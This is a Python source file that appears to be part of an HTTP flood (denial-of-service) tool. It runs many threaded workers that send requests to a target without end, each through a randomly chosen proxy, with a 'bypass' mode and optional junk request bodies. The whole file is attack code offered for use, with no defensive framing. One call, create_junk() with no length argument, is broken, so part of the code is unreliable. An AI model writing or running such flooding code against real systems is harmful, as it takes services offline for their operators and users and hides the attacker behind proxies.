import time

import logger
from utils.async_utils import create_async_task
from utils.httpmimic import HTTPMimic
from utils.proxy_parser import get_random_proxy
from utils.socket_utils import create_tcp, parse_target

def create_junk(length: int):
    return " " * length

def run_http(target, bypass: bool, method: str, random_body: bool, worker_id: int):
    job_id = 0
    pad_worker_id = str(worker_id).rjust(2, "0")
    
    host = target["host"]
    port = target["port"]
    path = target["path"]
    raw_target = f"{host}:{port}"
    
    while True:
        prefix = f"[Worker-{pad_worker_id} | Job-{job_id}]  "
        random_proxy = get_random_proxy()
        logger.info(f"{prefix} Sending <lmagenta>HTTP<reset> request <lcyan>(proxy={random_proxy}) <reset>to <lgreen>{raw_target}")   
        
        try:
            socket = create_tcp(raw_target, random_proxy)
            client = HTTPMimic(socket, bypass)
            client.send_version(method, path)
            client.send_headers(host)
            
            if random_body:
                client.send_body(create_junk())
            else:
                client.flush()
                
            client.recv(512)
        except Exception as e:
            logger.err(f"{prefix} <lred>Error: {e}<reset>")
        
        time.sleep(0.1)
        job_id += 1 

def async_run_http(threads: int, raw_target: str, bypass: bool, method: str, random_body: bool):   
    target = parse_target(raw_target)
    create_async_task(threads, run_http, (target, bypass, method, random_body))